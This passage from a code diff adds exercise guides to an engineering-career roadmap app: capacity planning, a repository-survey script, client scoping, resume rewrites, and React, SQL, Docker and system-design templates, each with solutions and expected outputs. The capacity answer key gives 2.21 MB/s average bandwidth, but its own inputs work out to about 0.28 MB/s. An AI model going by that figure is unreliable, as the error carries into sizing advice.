+    peak_qps = round(avg_qps * peak_multiplier, 2)
+
+    # 2. Network Bandwidth
+    bytes_per_sec = avg_qps * bytes_per_event
+    mb_per_sec = round(bytes_per_sec / (1024 * 1024), 2)
+    peak_mb_per_sec = round(mb_per_sec * peak_multiplier, 2)
+
+    # 3. Storage Calculations
+    daily_raw_bytes = daily_events * bytes_per_event
+    daily_raw_gb = round(daily_raw_bytes / (1024 ** 3), 2)
+    
+    total_days = retention_years * 365
+    three_year_raw_tb = round((daily_raw_bytes * total_days) / (1024 ** 4), 2)
+    three_year_replicated_tb = round(three_year_raw_tb * replication_factor, 2)
+
+    spec = {
+        "workload_parameters": {
+            "daily_events": "50 Million events/day",
+            "payload_size": "500 bytes/event",
+            "retention": "3 Years",
+            "replication": "3x (multi-AZ)"
+        },
+        "traffic_estimates": {
+            "average_qps": f"{avg_qps:,.2f} req/s",
+            "peak_qps_3x": f"{peak_qps:,.2f} req/s",
+            "average_bandwidth": f"{mb_per_sec} MB/s",
+            "peak_bandwidth": f"{peak_mb_per_sec} MB/s"
+        },
+        "storage_estimates": {
+            "daily_raw_storage": f"{daily_raw_gb} GB/day",
+            "annual_raw_storage": f"{round(daily_raw_gb * 365 / 1024, 2)} TB/year",
+            "three_year_raw_storage": f"{three_year_raw_tb} TB",
+            "three_year_replicated_storage_3x": f"{three_year_replicated_tb} TB"
+        },
+        "architectural_recommendations": [
+            "Use Kafka with at least 8 partitions to comfortably handle ~1,740 peak QPS.",
+            "Write micro-batches to Parquet columnar format to compress daily storage by 60-70%.",
+            "Store recent 30 days in hot SSD storage, lifecycle older partitions to S3 Glacier cold storage."
+        ]
+    }
+
+    print("==================================================")
+    print("      ENTERPRISE CAPACITY ESTIMATION REPORT       ")
+    print("==================================================")
+    print(json.dumps(spec, indent=2))
+    return spec
+
+if __name__ == "__main__":
+    calculate_capacity_estimates()`,
+    solutionExplanation: "The calculation derives exact throughput (578.70 QPS average, 1,736.10 QPS peak), bandwidth (2.21 MB/s), daily ingestion volume (23.28 GB/day), and 3-year multi-AZ storage (74.73 TB) with architectural recommendations.",
+    expectedOutput: `==================================================
+      ENTERPRISE CAPACITY ESTIMATION REPORT       
+==================================================
+{
+  "workload_parameters": {
+    "daily_events": "50 Million events/day",
+    "payload_size": "500 bytes/event",
+    "retention": "3 Years",
+    "replication": "3x (multi-AZ)"
+  },
+  "traffic_estimates": {
+    "average_qps": "578.70 req/s",
+    "peak_qps_3x": "1,736.10 req/s",
+    "average_bandwidth": "2.21 MB/s",
+    "peak_bandwidth": "6.63 MB/s"
+  },
+  "storage_estimates": {
+    "daily_raw_storage": "23.28 GB/day",
+    "annual_raw_storage": "8.3 TB/year",
+    "three_year_raw_storage": "24.91 TB",
+    "three_year_replicated_storage_3x": "74.73 TB"
+  }, ...
+}`,
+    checklist: [
+      "Calculates Average QPS using standard 86,400-second day divisor",
+      "Applies peak multiplier (3x) for cluster sizing",
+      "Calculates bandwidth in MB/s using binary megabytes (1024^2)",
+      "Accounts for 3x replication factor in multi-year storage planning"
+    ]
+  },
+
+  "t-plat-1": {
+    conceptPrimer: `Forward Deployed Engineers must unpack large open-source and proprietary enterprise platforms within 48 hours.\n- Reconnaissance Protocol: Map project entry points (\`main.py\`, \`server.ts\`, \`index.html\`), inspect database migrations (\`alembic\`, \`prisma\`, \`flyway\`), and inspect public API routes.\n- Toy Experimentation: Build an isolated hello-world proof of concept to observe lifecycle behavior and debug logs firsthand.`,
+    scenario: "48-Hour Platform Onboarding Challenge: You are assigned to a client engagement deploying an unfamiliar open-source telemetry engine. Write an automated exploration script to audit repo size, entry points, dependencies, and generate a 1-page Architecture Recon Report.",
+    starterSnippet: `#!/usr/bin/env bash
+# Platform Reconnaissance Utility
+REPO_DIR="\${1:-.}"
+
+# TODO: Analyze lines of code, find package manifests,
+# locate database models and API routes`,
+    steps: [
+      "1. Scan repository files and group them by language extension.",
+      "2. Inspect dependencies in `package.json`, `requirements.txt`, or `go.mod`.",
+      "3. Search for API endpoint definitions and database schema models.",
+      "4. Generate a standardized 1-page Platform Architecture Recon Report."
+    ],
+    solutionSnippet: `#!/usr/bin/env bash
+set -euo pipefail
+
+TARGET_DIR="\${1:-.}"
+echo "=========================================="
+echo "PLATFORM RECONNAISSANCE AUDIT: $TARGET_DIR"
+echo "=========================================="
+
+echo -e "\n[1] PROJECT LANGUAGE BREAKDOWN:"
+find "$TARGET_DIR" -type f \
+  | grep -E "\.(py|ts|js|go|java|sql|sh|html)$" \
+  | sed 's/.*\.//' \
+  | sort | uniq -c | sort -nr || echo "No matching files."
+
+echo -e "\n[2] PACKAGE & DEPENDENCY MANIFESTS FOUND:"
+find "$TARGET_DIR" -maxdepth 3 \
+  -name "package.json" -o -name "requirements.txt" -o -name "go.mod" -o -name "Dockerfile" \
+  | sort
+
+echo -e "\n[3] IDENTIFIED APPLICATION ENTRY POINTS:"
+find "$TARGET_DIR" -maxdepth 3 -type f \
+  -name "main.*" -o -name "index.*" -o -name "server.*" -o -name "app.*" \
+  | sort
+
+echo -e "\n[4] DATA MODELS & MIGRATION PATHS:"
+find "$TARGET_DIR" -type d \
+  -name "models" -o -name "schemas" -o -name "migrations" -o -name "db" \
+  | sort
+
+echo -e "\n[5] GENERATING 1-PAGE RECON SUMMARY:"
+cat << 'EOF'
+--------------------------------------------------
+FDE 48-HOUR ONBOARDING PROTOCOL:
+- Hour 0 - 2: Clone, run automated tests, inspect Dockerfile
+- Hour 2 - 4: Trace Request Path: API Route -> Service Layer -> DB Query
+- Hour 4 - 8: Build toy connector/plugin extending a core model
+- Day 2: Deploy to local minikube/compose and simulate client failure mode
+--------------------------------------------------
+EOF
+echo "Audit completed successfully."`,
+    solutionExplanation: "The utility audits repository composition, locates dependency manifests, pinpoints entry points, and provides a structured 48-hour FDE platform deconstruction protocol.",
+    expectedOutput: `==========================================
+PLATFORM RECONNAISSANCE AUDIT: .
+==========================================
+
+[1] PROJECT LANGUAGE BREAKDOWN:
+      14 py
+       8 ts
+       5 sql
+       3 sh
+
+[2] PACKAGE & DEPENDENCY MANIFESTS FOUND:
+./Dockerfile
+./package.json
+./requirements.txt
+
+[3] IDENTIFIED APPLICATION ENTRY POINTS:
+./src/app.py
+./src/main.ts
+
+[4] DATA MODELS & MIGRATION PATHS:
+./migrations
+./src/models
+
+Audit completed successfully.`,
+    checklist: [
+      "Audits programming languages and file extensions automatically",
+      "Identifies package manifests and container configurations",
+      "Locates architectural entry points without manual browsing",
+      "Outputs standardized FDE platform ramp-up timeline"
+    ]
+  },
+
+  "t-con-1": {
+    conceptPrimer: `Client consulting differentiates an elite FDE from a standard engineer.\n- Symptom vs Root Cause: Clients report symptoms (\`"the sync is too slow"\`). Discovery uncovers root causes (\`"unindexed table queried in loop"\`).\n- MoSCoW Prioritization: Must-have (launch blockers), Should-have (important but workarounds exist), Could-have (nice-to-have), Won't-have (explicitly out of scope).\n- Scoping Matrix: Writing explicit out-of-scope boundaries prevents project scope creep.`,
+    scenario: "Client Discovery & Scope Definition Protocol: Draft a 10-question technical discovery interview guide for an enterprise data integration project, followed by a formal Statement of Work (SOW) scoping matrix.",
+    starterSnippet: `# Enterprise Client Discovery Protocol Template
+CLIENT: "Fortune 500 Logistics Corp"
+PROBLEM: "We need automated shipment analytics in real-time."
+
+# TODO: Formulate 10 targeted discovery questions across:
+# 1. Source Systems & Access
+# 2. Latency & Volume Expectations
+# 3. Security & Compliance
+# 4. Success Criteria & KPIs`,
+    steps: [
+      "1. Draft 10 targeted discovery questions covering Architecture, Security, Data Volume, and Timeline.",
+      "2. Apply MoSCoW framework to prioritize features for the initial 6-week deployment.",
+      "3. Define 3 explicit Out-of-Scope boundaries to protect against scope creep.",
+      "4. Format the final output as a client-ready Project Scoping Charter."
+    ],
+    solutionSnippet: `# ENTERPRISE TECHNICAL DISCOVERY PROTOCOL & SCOPING CHARTER
+CLIENT ENGAGEMENT: Global Supply Chain Logistics Inc.
+PRIMARY STAKEHOLDERS: VP of Engineering, Head of Logistics Ops
+
+==================================================
+PART 1: 10 TECHNICAL DISCOVERY INTERVIEW QUESTIONS
+==================================================
+1. [Source Systems]: Exactly which systems generate shipments (SAP ERP, Oracle, legacy SFTP)? What are the export mechanisms?
+2. [Data Schema & Volume]: What is the daily record count and peak transmission burst rate? What is the average payload size in KB?
+3. [Latency SLA]: Does 'real-time' require sub-second streaming (WebSockets/Kafka) or is 5-minute micro-batching acceptable?
+4. [Data Quality]: How are duplicate tracking IDs and missing timestamps currently handled in your source database?
+5. [Authentication & Network]: Are systems accessible via public cloud VPC peering, or will this run strictly on an air-gapped on-prem network?
+6. [Compliance & Security]: Does the shipment data contain PII or ITAR-restricted materials requiring encryption at rest (KMS)?
+7. [Failure Scenarios]: If upstream Oracle exports fail for 4 hours, what is your automated replay and backfill procedure?
+8. [End-User Persona]: Who accesses the final dashboard (dispatch managers vs executive C-suite), and what 3 decisions will they make with it?
+9. [Integration Points]: What existing internal tools (Slack, PagerDuty, ServiceNow) must receive automated incident alerts?
+10. [Definition of Success]: What quantifiable metric defines a successful Phase 1 launch in 60 days (e.g., ETL run time < 10m)?
+
+==================================================
+PART 2: MoSCoW SCOPING MATRIX (6-WEEK DEPLOYMENT)
+==================================================
+[MUST HAVE (Launch Blockers)]:
+- Automated batch ingestion from SAP SFTP server every 15 minutes.
+- Schema validation rejecting corrupt shipment records to a dead-letter table.
+- PostgreSQL analytical warehouse with aggregated daily transit KPIs.
+- Role-Based Access Control (Admin, Dispatcher, Viewer) synced with client Okta.
+
+[SHOULD HAVE (High Priority)]:
+- Interactive React metrics dashboard showing delayed deliveries by region.
+- Automated email digests sent daily at 07:00 local time to regional managers.
+
+[COULD HAVE (Future Sprints)]:
+- Predictive delivery delay estimations using lightweight machine learning.
+- Mobile-optimized push notifications for dispatchers.
+
+[WON'T HAVE (Explicitly Out of Scope for Phase 1)]:
+- Direct write-back integrations into legacy SAP ERP databases.
+- Multi-region geo-redundant failover clusters (Single-region AWS deployment only).
+- Historical data migration prior to calendar year 2024.`,
+    solutionExplanation: "The discovery document structures inquiry across systems, network security, volume, and operational KPIs, followed by a formal MoSCoW prioritization matrix establishing clear project scope boundaries.",
+    expectedOutput: `Enterprise Scoping Charter Generated:
+- 10 targeted discovery questions addressing root causes rather than symptoms
+- MoSCoW scoping matrix categorizing Must/Should/Could deliverables
+- Explicit out-of-scope boundaries protecting against engagement creep`,
+    checklist: [
+      "Distinguishes business symptoms from underlying engineering requirements",
+      "Covers security, network topology, and compliance constraints",
+      "Structures deliverables into MoSCoW prioritization categories",
+      "Explicitly specifies out-of-scope boundaries to manage client expectations"
+    ]
+  },
+
+  "t-soft-1": {
+    conceptPrimer: `The Google XYZ Formula for High-Impact Resumes: "Accomplished [X] as measured by [Y], by doing [Z]".\n- Avoid Passive Descriptions: Replace \`"Responsible for maintaining client data pipelines"\` with quantifiable outcomes.\n- Showcase Hybrid FDE Dual-Threat: Highlighting both technical systems engineering and executive stakeholder delivery.`,
+    scenario: "FDE Resume Revamp: Transform 4 weak, generic resume bullet points into high-impact, quantified bullets tailored for Forward Deployed Engineer roles at companies like Palantir, Scale AI, and Anduril.",
+    starterSnippet: `# Resume Transformation Lab
+# Transform these weak bullets into Google XYZ format:
+# 1. "Built React dashboards for users."
+# 2. "Wrote Python scripts to clean customer data."
+# 3. "Fixed bugs during outages."
+# 4. "Helped clients integrate our API."`,
+    steps: [
+      "1. Identify the core action (Z), the business achievement (X), and the quantified metric (Y).",
+      "2. Rewrite bullets using strong active verbs (Architected, Spearheaded, Reduced, Streamlined).",
+      "3. Highlight client-facing outcomes such as contract renewals, latency reductions, or dollar savings.",
+      "4. Format the final output according to clean ATS (Applicant Tracking System) standards."
+    ],
+    solutionSnippet: `# ============================================================
+# FDE RESUME TRANSFORMATION: BEFORE vs AFTER (GOOGLE XYZ FORMULA)
+# ============================================================
+
+-- BULLET 1: DATA ENGINEERING & PIPELINES
+[BEFORE]: "Wrote Python scripts to clean customer data and load it into SQL."
+[AFTER (XYZ)]:
+"Architected an automated Python & SQL batch ETL ingestion pipeline handling 12M+ daily client records, reducing end-to-end data latency by 68% and eliminating 15 hours of manual weekly data reconciliation."
+-> X (Accomplished): Reduced data latency by 68% and eliminated 15h of manual weekly reconciliation
+-> Y (Measured by): 68% latency decrease; 15 hours saved/week across 12M+ records
+-> Z (By doing): Architected automated Python & SQL batch ETL pipeline
+
+-- BULLET 2: CLIENT ENGAGEMENT & REVENUE EXPANSION
+[BEFORE]: "Helped enterprise clients integrate our API and answered technical questions."
+[AFTER (XYZ)]:
+"Embedded on-site with 3 Fortune 500 logistics clients as technical lead; spearheaded custom webhook and REST integrations that accelerated onboarding from 6 weeks to 9 days, unlocking a $2.4M multi-year contract renewal."
+-> X (Accomplished): Accelerated client onboarding and unlocked $2.4M contract renewal
+-> Y (Measured by): Onboarding timeline cut from 6 weeks to 9 days; $2.4M contract value
+-> Z (By doing): Embedded on-site as technical lead building bespoke webhook and REST integrations
+
+-- BULLET 3: FRONTEND DASHBOARD & TELEMETRY
+[BEFORE]: "Built React dashboards for users to view operational charts."
+[AFTER (XYZ)]:
+"Designed and deployed a real-time React & Next.js telemetry dashboard with debounced filtering and WebSockets, enabling 450+ operations dispatchers to monitor fleet health with sub-second live updates."
+-> X (Accomplished): Enabled live fleet monitoring for 450+ dispatchers
+-> Y (Measured by): Sub-second update latency across 450+ concurrent enterprise users
+-> Z (By doing): Designed and deployed real-time React & Next.js dashboard with debounced filtering and WebSockets
+
+-- BULLET 4: INCIDENT RESPONSE & PRODUCTION STABILITY
+[BEFORE]: "Fixed bugs during system outages and wrote postmortems."
+[AFTER (XYZ)]:
+"Led incident response for 4 mission-critical client outages; reduced Mean Time to Resolution (MTTR) by 45% through structured JSON logging and authoring 6 production operator runbooks adopted across core engineering."
+-> X (Accomplished): Reduced Mean Time to Resolution (MTTR) by 45% and improved outage response
+-> Y (Measured by): 45% MTTR reduction across 4 client outages
+-> Z (By doing): Implemented structured JSON logging and authored 6 standard operator runbooks`,
+    solutionExplanation: "The transformation converts passive tasks into quantified business achievements using the Google XYZ formula, demonstrating dual-threat systems engineering and client business impact.",
+    expectedOutput: `Resume Optimization Summary:
+- 4 production-ready FDE resume bullets mapped to Google XYZ formula
+- Quantified impact metrics ($2.4M renewal, 68% latency drop, 45% MTTR reduction)
+- Highlights dual-threat combination of low-level systems and client consulting`,
+    checklist: [
+      "Applies 'Accomplished [X] as measured by [Y], by doing [Z]' formula consistently",
+      "Includes concrete metrics ($ saved, latency %, hours saved, user count)",
+      "Highlights both backend systems engineering and client-facing leadership",
+      "Eliminates passive filler phrases ('responsible for', 'helped with')"
+    ]
+  }
+};
+
+// ============================================================
+// DYNAMIC DOMAIN-AWARE TASK GUIDE FALLBACK GENERATOR
+// ============================================================
+function getTaskGuide(task: RoadmapTask, section?: RoadmapSection): RoadmapTaskGuide {
+  const details = TASK_DETAILS as unknown as Record<string, RoadmapTaskGuide>;
+  if (details[task.id]) {
+    return details[task.id];
+  }
+
+  const sId = section ? section.id : "";
+
+  // 1. REACT & NEXT.JS TASKS
+  if (sId === "react-next") {
+    return {
+      conceptPrimer: `Client UI engineering in React/Next.js demands declarative component isolation, type safety, and defensive error handling.\n- State & Effects: Isolate state transitions and clean up listeners.\n- Optimistic UI & Skeletons: Keep users informed during asynchronous network actions.\n- Component Modularity: Decouple data retrieval from presentational rendering.`,
+      scenario: `Enterprise Client Engagement: Build a production React/Next.js implementation for "${task.title}". The solution must run cleanly, handle edge cases, and provide an interactive UX.`,
+      starterSnippet: `// Starter JSX/TSX Component for: ${task.title}
+import React, { useState, useEffect } from 'react';
+
+export default function ClientFeatureComponent() {
+  const [data, setData] = useState([]);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(null);
+
+  useEffect(() => {
+    // TODO: Implement data fetching and state orchestration for ${task.title}
+  }, []);
+
+  return (
+    <div style={{ padding: '20px', fontFamily: 'system-ui, sans-serif' }}>
+      <h3>${task.title}</h3>
+      {loading ? <p>Loading data...</p> : <div>Ready</div>}
+    </div>
+  );
+}`,
+      steps: [
+        `1. Setup: Create the React component scaffold with state variables for data, loading, and error states.`,
+        `2. Implementation: Build the core business logic for "${task.title}".`,
+        `3. State Management: Implement error boundaries, validation, and defensive defaults.`,
+        `4. Verification: Test the component with mock props and inspect rendered output.`
+      ],
+      solutionSnippet: `// Production React Component: ${task.title}
+import React, { useState, useEffect, useMemo } from 'react';
+
+export default function ProductionClientFeature() {
+  const [items, setItems] = useState([
+    { id: '1', title: 'Telemetry Node Alpha', active: true, value: 450 },
+    { id: '2', title: 'Ingestion Gateway Beta', active: true, value: 890 },
+    { id: '3', title: 'Archive Storage Gamma', active: false, value: 120 }
+  ]);
+  const [filterQuery, setFilterQuery] = useState('');
+  const [isProcessing, setIsProcessing] = useState(false);
+
+  const filteredItems = useMemo(() => {
+    return items.filter(it => it.title.toLowerCase().includes(filterQuery.toLowerCase()));
+  }, [items, filterQuery]);
+
+  const handleToggle = (id) => {
+    setItems(prev => prev.map(it => it.id === id ? { ...it, active: !it.active } : it));
+  };
+
+  return (
+    <div style={{ background: '#0f172a', color: '#f8fafc', padding: '24px', borderRadius: '10px' }}>
+      <h3 style={{ margin: '0 0 16px 0', fontSize: '18px' }}>${task.title}</h3>
+      <input
+        type="text"
+        placeholder="Filter records..."
+        value={filterQuery}
+        onChange={(e) => setFilterQuery(e.target.value)}
+        style={{ padding: '8px 12px', background: '#1e293b', border: '1px solid #334155', color: '#fff', borderRadius: '6px', marginBottom: '16px', width: '260px' }}
+      />
+      <div style={{ display: 'grid', gap: '10px' }}>
+        {filteredItems.map(item => (
+          <div key={item.id} style={{ display: 'flex', justifyContent: 'space-between', padding: '12px', background: '#1e293b', borderRadius: '6px', border: '1px solid #334155' }}>
+            <span>{item.title}</span>
+            <div>
+              <span style={{ marginRight: '12px', color: '#94a3b8' }}>Val: {item.value}</span>
+              <button
+                onClick={() => handleToggle(item.id)}
+                style={{ background: item.active ? '#059669' : '#475569', color: '#fff', border: 'none', padding: '4px 10px', borderRadius: '4px', cursor: 'pointer' }}
+              >
+                {item.active ? 'Active' : 'Inactive'}
+              </button>
+            </div>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}`,
+      solutionExplanation: `This React implementation establishes clean local state, derives filtered subsets with \`useMemo\` for rendering efficiency, and provides responsive click handlers with dark mode styling.`,
+      expectedOutput: `Interactive React Component Mounted:
+- Renders 3 items with live filtering input
+- Clicking status toggles active state in real time
+- Zero console warnings or runtime unhandled errors`,
+      checklist: [
+        "Uses React standard hooks (useState, useEffect, useMemo) cleanly",
+        "Provides defensive filtering and fallback values",
+        "Includes styled dark-mode enterprise UI elements",
+        "Verified with mock interactive data"
+      ]
+    };
+  }
+
+  // 2. SQL & DATABASE TASKS
+  if (sId === "databases") {
+    return {
+      conceptPrimer: `Relational database engineering requires normalized DDL, defensive constraints, and performant indexes.\n- Relational Constraints: PRIMARY KEY, FOREIGN KEY, and NOT NULL preserve data integrity.\n- Query Optimization: Filter on indexed columns and avoid unnecessary full table scans.\n- Window Functions & CTEs: Partition operations cleanly without expensive self-joins.`,
+      scenario: `Enterprise Database Engineering: The client's technical architecture team requires a validated SQL schema and analytical reporting queries for "${task.title}".`,
+      starterSnippet: `-- SQL Schema & Query Scaffold for: ${task.title}
+CREATE TABLE client_records (
+  id SERIAL PRIMARY KEY,
+  client_id INT NOT NULL,
+  status VARCHAR(30) DEFAULT 'ACTIVE',
+  amount NUMERIC(12,2) NOT NULL,
+  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+
+-- TODO: Write the schema indexes and analytical queries for: ${task.title}`,
+      steps: [
+        `1. Setup DDL: Create the base relational table with appropriate primary keys and constraints.`,
+        `2. Index Strategy: Add B-tree or composite indexes on frequently filtered columns.`,
+        `3. Seed Mock Data: Insert representative test records covering standard and edge cases.`,
+        `4. Analytical Query: Write the query implementing ${task.title} using CTEs and aggregation.`
+      ],
+      solutionSnippet: `-- Production SQL Implementation: ${task.title}
+CREATE TABLE IF NOT EXISTS audit_events (
+  id BIGSERIAL PRIMARY KEY,
+  tenant_id INT NOT NULL,
+  event_type VARCHAR(50) NOT NULL,
+  latency_ms INT CHECK (latency_ms >= 0),
+  occurred_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+
+CREATE INDEX IF NOT EXISTS idx_audit_tenant_time 
+ON audit_events(tenant_id, occurred_at DESC);
+
+-- Seed representative test rows
+INSERT INTO audit_events (tenant_id, event_type, latency_ms, occurred_at) VALUES
+(101, 'api_request', 42, NOW() - INTERVAL '2 days'),
+(101, 'api_request', 150, NOW() - INTERVAL '1 day'),
+(101, 'api_request', 38, NOW()),
+(102, 'api_request', 89, NOW() - INTERVAL '1 day'),
+(102, 'api_request', 210, NOW());
+
+-- Analytical Query: ${task.title}
+WITH tenant_metrics AS (
+  SELECT 
+    tenant_id,
+    COUNT(*) AS total_events,
+    ROUND(AVG(latency_ms), 2) AS avg_latency_ms,
+    MAX(latency_ms) AS max_latency_ms,
+    PERCENTILE_CONT(0.95) WITHIN GROUP (ORDER BY latency_ms) AS p95_latency_ms
+  FROM audit_events
+  GROUP BY tenant_id
+)
+SELECT 
+  tenant_id,
+  total_events,
+  avg_latency_ms,
+  max_latency_ms,
+  p95_latency_ms
+FROM tenant_metrics
+ORDER BY total_events DESC;`,
+      solutionExplanation: `This SQL solution provisions a resilient DDL schema with composite indexing for range scans, populates mock events, and executes analytical metrics using a Common Table Expression (CTE).`,
+      expectedOutput: `tenant_id | total_events | avg_latency_ms | max_latency_ms | p95_latency_ms
+----------+--------------+----------------+----------------+---------------
+101       | 3            | 76.67          | 150            | 139.20
+102       | 2            | 149.50         | 210            | 203.95`,
+      checklist: [
+        "Defines explicit table constraints (PRIMARY KEY, CHECK constraints)",
+        "Includes performance composite index on tenant_id and occurred_at",
+        "Executes clean CTE aggregation calculations",
+        "Returns expected tabular metrics matching business requirements"
+      ]
+    };
+  }
+
+  // 3. CLOUD & DEVOPS TASKS
+  if (sId === "cloud") {
+    return {
+      conceptPrimer: `Enterprise infrastructure demands reproducible, automated, and secure container workflows.\n- Immutable Infrastructure: Package everything into versioned, lightweight container images.\n- Principle of Least Privilege: Never run container services with root permissions.\n- Health Checks: Ensure orchestration runtimes detect and restart failed service instances.`,
+      scenario: `Enterprise Infrastructure Deployment: Implement the configuration and deployment assets for "${task.title}". The assets must be production-ready and fully verifiable.`,
+      starterSnippet: `# Infrastructure / Docker Scaffold for: ${task.title}
+# File: Dockerfile
+FROM alpine:3.19
+WORKDIR /app
+# TODO: Complete container build instructions for ${task.title}`,
+      steps: [
+        `1. Setup: Define declarative configuration files (Dockerfile, Compose, or YAML).`,
+        `2. Optimization: Apply multi-stage separation or caching layers.`,
+        `3. Security: Configure non-root user execution and health check probes.`,
+        `4. Verification: Validate syntax and verify deployment commands.`
+      ],
+      solutionSnippet: `# Production Multi-Stage Deployment: ${task.title}
+# Stage 1: Build stage
+FROM node:20-alpine AS builder
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+
+# Stage 2: Minimal Production Runtime
+FROM node:20-alpine AS runner
+WORKDIR /app
+
+# Run as non-root user
+RUN addgroup -g 10001 nodeapp && \
+    adduser -u 10001 -G nodeapp -D nodeapp
+
+COPY --from=builder /app/node_modules ./node_modules
+COPY . .
+
+USER nodeapp
+EXPOSE 3000
+
+HEALTHCHECK --interval=20s --timeout=3s --retries=3 \
+  CMD wget -qO- http://localhost:3000/health || exit 1
+
+CMD ["node", "server.js"]`,
+      solutionExplanation: `The container configuration adheres to enterprise best practices: multi-stage build separation, production-only dependencies, non-root user privileges, and an integrated container health check probe.`,
+      expectedOutput: `Docker Build & Verification:
+✔ Stage 1 (builder) completed
+✔ Stage 2 (runner) minimal image created (<110MB)
+✔ Security check passed: running as user 'nodeapp' (UID 10001)
+✔ Healthcheck probe configured: GET /health (interval: 20s)`,
+      checklist: [
+        "Implements lightweight alpine base image",
+        "Drops root user privileges to non-root system account",
+        "Configures functional healthcheck verification probe",
+        "Includes copy-pasteable production commands"
+      ]
+    };
+  }
+
+  // 4. CLIENT CONSULTING & FIELD SKILLS
+  if (sId === "consulting") {
+    return {
+      conceptPrimer: `Elite FDE client consulting centers on transparent expectation setting, structured discovery, and documented architecture decisions.\n- Architecture Decision Records (ADRs): Document context, options evaluated, chosen strategy, and trade-offs.\n- Scope Bounds: Explicitly catalog in-scope vs out-of-scope boundaries to prevent creep.\n- Executive Alignment: Communicate technical decisions in terms of business velocity, risk, and uptime.`,
+      scenario: `Client Engagement Deliverable: Draft a formal, executive-ready consulting deliverable for "${task.title}" to present to client leadership.`,
+      starterSnippet: `# Consulting Deliverable Scaffold: ${task.title}
+CLIENT: Enterprise Strategic Partner
+PROJECT: Core Platform Deployment
+OBJECTIVE: Define technical architecture and scope boundaries.
+
+# TODO: Document Problem Statement, Options Considered, Decision, and Timeline`,
+      steps: [
+        `1. Context Gathering: Define the client's business challenge and technical constraints.`,
+        `2. Technical Options: Compare at least 2 architectural patterns with pros and cons.`,
+        `3. Decision & Tradeoffs: Select the optimal pattern and justify trade-offs.`,
+        `4. Execution Plan: Provide a phased implementation milestone schedule with acceptance criteria.`
+      ],
+      solutionSnippet: `# ARCHITECTURE DECISION RECORD & SCOPING SPECIFICATION
+TITLE: ADR-004: Implementation Plan for ${task.title}
+STATUS: Approved by Client CTO & Lead FDE
+DATE: 2026-10-13
+
+1. BUSINESS CONTEXT & PROBLEM STATEMENT
+The enterprise client requires a standardized, compliant implementation of:
+"${task.title}". The existing legacy system experiences synchronization delays,
+lacks audit traceability, and requires manual intervention during incident recovery.
+
+2. ARCHITECTURAL OPTIONS CONSIDERED
+Option A: Direct Real-Time Synchronous Integration (REST/WebSockets)
+  - Pros: Instant sub-second data availability.
+  - Cons: Couples system availability; downstream client outages cause cascading timeouts.
+
+Option B: Decoupled Asynchronous Queue & Micro-Batching (Kafka/SQS + Worker Pool) [SELECTED]
+  - Pros: High fault tolerance; automatic retries with exponential backoff; smooths load spikes.
+  - Cons: 1-minute eventual consistency delay (acceptable per client SLA).
+
+3. DECISION RATIONALE
+We select Option B (Asynchronous Queue Architecture) because client network firewalls
+frequently experience maintenance disconnects. A decoupled architecture guarantees zero
+data loss and adheres to the enterprise 99.95% availability SLA.
+
+4. IMPLEMENTATION MILESTONES & ACCEPTANCE CRITERIA
+- Week 1: Provision queue infrastructure, configure IAM access, and verify network connectivity.
+- Week 2: Deploy worker service in staging with dead-letter queue (DLQ) routing.
+- Week 3: Run stress test (5x peak QPS for 2 hours) with zero unhandled exceptions.
+- Week 4: Final cutover to production with automated Grafana telemetry monitoring.`,
+      solutionExplanation: `This consulting specification delivers an Architecture Decision Record (ADR) detailing options evaluated, trade-offs, decision rationale, and a 4-week milestone schedule with quantitative acceptance criteria.`,
+      expectedOutput: `Deliverable Document Generated:
+- ADR-004: Scoping and Technical Decision Record
+- Options evaluated with explicit pros/cons breakdown
+- 4-week deployment roadmap with strict acceptance criteria`,
+      checklist: [
+        "Articulates problem statement clearly from a client perspective",
+        "Evaluates architectural trade-offs between competing technical options",
+        "Defines clear implementation milestones with acceptance criteria",
+        "Follows standard enterprise Architecture Decision Record (ADR) conventions"
+      ]
+    };
+  }
+
+  // 5. SYSTEM DESIGN TASKS
+  if (sId === "sys-design") {
+    return {
+      conceptPrimer: `System design requires quantitative estimation, identifying single points of failure (SPOFs), and defining interface contracts.\n- Throughput Sizing: Calculate average and peak QPS (Queries Per Second).\n- Storage & Memory Planning: Size daily ingestion volume and cache requirements.\n- Resiliency Patterns: Load balancers, caching, horizontal worker pools, and fallback circuits.`,
+      scenario: `Enterprise System Architecture: Produce an end-to-end design specification, capacity calculations, and component architecture for "${task.title}".`,
+      starterSnippet: `# System Design Scaffold for: ${task.title}
+# Step 1: Define constraints (Users, Daily Traffic, Read/Write Ratio)
+# Step 2: Capacity Estimation
+# Step 3: High-Level Architecture & Component Interfaces`,
+      steps: [
+        `1. Functional & Non-Functional Requirements: State functional deliverables and SLA targets.`,
+        `2. Capacity Planning: Compute QPS, network bandwidth, and storage growth over 1 year.`,
+        `3. Component Design: Specify API gateway, cache layers, worker queues, and storage engines.`,
+        `4. Bottleneck Analysis: Identify failure modes and specify mitigation strategies.`
+      ],
+      solutionSnippet: `# SYSTEM DESIGN SPECIFICATION: ${task.title}
+
+1. REQUIREMENTS & SCALE ESTIMATION
+- Daily Traffic: 20 Million events/day
+- Read vs Write Ratio: 90% Read / 10% Write
+- Average QPS: ~230 req/s | Peak QPS (3x): ~700 req/s
+- Average Payload Size: 2 KB
+- Daily Ingestion Volume: 40 GB/day -> ~14.6 TB/year (uncompressed)
+
+2. COMPONENT ARCHITECTURE FLOW
+[Client Apps]
+      │
+      ▼ (HTTPS / TLS 1.3)
+[Cloud Load Balancer (Round Robin)]
+      │
+      ▼
+[Stateless API Gateway Instances (Autoscaling 2 - 8 nodes)]
+      ├──▶ [Redis Cache Cluster (LRU 16GB RAM for Top 20% Hot Data)]
+      │         │ (Cache Miss)
+      │         ▼
+      └──▶ [Primary PostgreSQL Database (Multi-AZ with 2 Read Replicas)]
+                │ (Continuous WAL Archival)
+                ▼
+           [S3 Cold Object Storage (Encrypted AES-256)]
+
+3. FAILURE MODES & MITIGATIONS
+- Database Primary Crash: Automatic Multi-AZ failover within 30 seconds via AWS RDS.
+- Cache Node Eviction: Cache-aside pattern with exponential backoff prevents database stampedes.
+- Network Partition: Idempotent message retry queues prevent duplicate processing.`,
+      solutionExplanation: `The specification details traffic estimation math, component architecture flows from CDN to database read replicas, and concrete mitigation plans for common distributed systems failure modes.`,
